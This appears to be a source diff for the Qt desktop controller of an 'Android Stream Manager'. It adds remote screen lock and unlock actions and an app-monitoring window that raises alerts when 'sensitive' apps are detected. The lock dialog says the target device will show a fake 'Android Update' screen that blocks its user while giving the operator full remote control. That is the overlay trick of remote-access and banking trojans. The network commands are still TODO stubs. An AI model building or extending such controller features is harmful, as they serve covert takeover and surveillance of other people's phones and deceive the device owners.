@@ -201,6 +201,25 @@ void MainWindow::setupMenuBar() {
     stopStreamAction->setStatusTip("Parar streaming atual");
     connect(stopStreamAction, &QAction::triggered, this, &MainWindow::onPauseStreamClicked);
 
+    streamingMenu->addSeparator();
+
+    QAction* lockScreenAction = streamingMenu->addAction("🔒 &Bloquear Tela Remota");
+    lockScreenAction->setShortcut(QKeySequence("Ctrl+Shift+L"));
+    lockScreenAction->setStatusTip("Bloquear tela do dispositivo remoto");
+    connect(lockScreenAction, &QAction::triggered, this, &MainWindow::onLockRemoteScreen);
+
+    QAction* unlockScreenAction = streamingMenu->addAction("🔓 &Desbloquear Tela Remota");
+    unlockScreenAction->setShortcut(QKeySequence("Ctrl+Shift+U"));
+    unlockScreenAction->setStatusTip("Desbloquear tela do dispositivo remoto");
+    connect(unlockScreenAction, &QAction::triggered, this, &MainWindow::onUnlockRemoteScreen);
+
+    streamingMenu->addSeparator();
+
+    QAction* appMonitoringAction = streamingMenu->addAction("📊 &Monitoramento de Apps");
+    appMonitoringAction->setShortcut(QKeySequence("Ctrl+Shift+A"));
+    appMonitoringAction->setStatusTip("Monitorar uso de aplicativos no dispositivo remoto");
+    connect(appMonitoringAction, &QAction::triggered, this, &MainWindow::showAppMonitoringWidget);
+
     // Menu Ajuda
     QMenu* helpMenu = menuBar->addMenu("Aj&uda");
 
@@ -920,6 +939,80 @@ void MainWindow::onStreamingStopped(const QString& deviceId) {
 void MainWindow::onStreamingError(const QString& error) {
     showEventLog("STREAMING", "Erro no streaming: " + error.toStdString());
     QMessageBox::warning(this, "Erro no Streaming", error);
+}
+
+// ========== CONTROLE REMOTO DE TELA ==========
+
+void MainWindow::onLockRemoteScreen() {
+    QListWidgetItem* selectedItem = deviceList->currentItem();
+    if (!selectedItem) {
+        QMessageBox::information(this, "Selecionar Dispositivo",
+                               "Por favor, selecione um dispositivo na lista para bloquear a tela remotamente.");
+        return;
+    }
+
+    QString deviceId = selectedItem->text().split(" - ").first();
+
+    // TODO: Implementar envio de comando de bloqueio via WebSocket para o dispositivo
+    // Por enquanto, apenas log
+    showEventLog("REMOTE_CONTROL", "Comando de bloqueio enviado para dispositivo: " + deviceId.toStdString());
+
+    QMessageBox::information(this, "Bloqueio Remoto",
+                           QString("Comando de bloqueio de tela enviado para o dispositivo %1.\n\n"
+                                   "O dispositivo irá mostrar uma tela de 'Atualização do Android' "
+                                   "que impede interação local mas permite controle remoto total.").arg(deviceId));
+}
+
+void MainWindow::onUnlockRemoteScreen() {
+    QListWidgetItem* selectedItem = deviceList->currentItem();
+    if (!selectedItem) {
+        QMessageBox::information(this, "Selecionar Dispositivo",
+                               "Por favor, selecione um dispositivo na lista para desbloquear a tela remotamente.");
+        return;
+    }
+
+    QString deviceId = selectedItem->text().split(" - ").first();
+
+    // TODO: Implementar envio de comando de desbloqueio via WebSocket para o dispositivo
+    showEventLog("REMOTE_CONTROL", "Comando de desbloqueio enviado para dispositivo: " + deviceId.toStdString());
+
+    QMessageBox::information(this, "Desbloqueio Remoto",
+                           QString("Comando de desbloqueio de tela enviado para o dispositivo %1.").arg(deviceId));
+}
+
+// ========== MONITORAMENTO DE APPS ==========
+
+void MainWindow::showAppMonitoringWidget() {
+    // Criar widget de monitoramento de apps se não existir
+    if (!appMonitoringWidget) {
+        appMonitoringWidget = new AppMonitoringWidget(this);
+        appMonitoringWidget->setWindowTitle("Monitoramento de Apps - Android Stream Manager");
+        appMonitoringWidget->resize(1200, 800);
+
+        // Conectar sinais
+        connect(appMonitoringWidget, &AppMonitoringWidget::appDetected,
+                this, &MainWindow::onAppDetected);
+        connect(appMonitoringWidget, &AppMonitoringWidget::sensitiveAppDetected,
+                this, &MainWindow::onSensitiveAppDetected);
+    }
+
+    appMonitoringWidget->show();
+    appMonitoringWidget->activateWindow();
+}
+
+void MainWindow::onAppDetected(const QString& appName, const QString& category) {
+    showEventLog("APP_MONITOR", QString("App detectado: %1 (%2)").arg(appName, category).toStdString());
+}
+
+void MainWindow::onSensitiveAppDetected(const QString& appName, const QString& category) {
+    showEventLog("SENSITIVE_APP", QString("🚨 App sensível detectado: %1 (%2)").arg(appName, category).toStdString());
+
+    // Mostrar notificação especial para apps sensíveis
+    QMessageBox::information(this, "App Sensível Detectado",
+                           QString("Um aplicativo sensível foi detectado:\n\n"
+                                   "📱 %1\n"
+                                   "🏷️ Categoria: %2\n\n"
+                                   "Este tipo de app está sendo monitorado.").arg(appName, category));
 }
 
 void MainWindow::showEvent(QShowEvent *event) {
